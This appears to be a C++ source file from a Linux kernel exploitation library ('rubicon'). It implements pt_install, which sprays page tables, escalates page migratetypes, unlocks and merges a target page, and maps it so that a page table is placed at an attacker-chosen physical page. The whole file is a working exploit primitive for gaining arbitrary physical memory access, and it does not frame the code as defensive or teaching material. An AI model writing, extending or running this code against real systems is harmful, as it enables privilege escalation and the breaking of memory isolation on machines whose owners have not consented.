#include "rubicon.hpp"

#include <cstdio>
#include <fcntl.h>
#include <sys/mman.h>

int pt_spray_bait_allocator(void* ctx) {
    return pt_spray_tables(*static_cast<pt_spray_args_t*>(ctx));
}

void
* pt_install(void* bait_ptr, void* pt_target, void* addr, int fd) {
    auto spray_args = pt_spray_args_t{
        .start = (void*)SPRAY_START,
        .fd = fd,
        .nr_tables = NR_PAGE_TABLES_SPRAY,
    };

    migratetype_escalation(bait_ptr, 9, pt_spray_bait_allocator,
                           &spray_args);
    pt_unspray_tables(spray_args);

    // Move the target as next candidate for page table allocation
    munlock(pt_target, PAGE_SIZE);
    block_merge(pt_target, 0);

    // Install the page table at the target.
    return mmap(addr, PAGE_SIZE,
                PROT_READ | PROT_WRITE,
                MAP_FIXED | MAP_SHARED | MAP_POPULATE,
                fd,
                0);
}
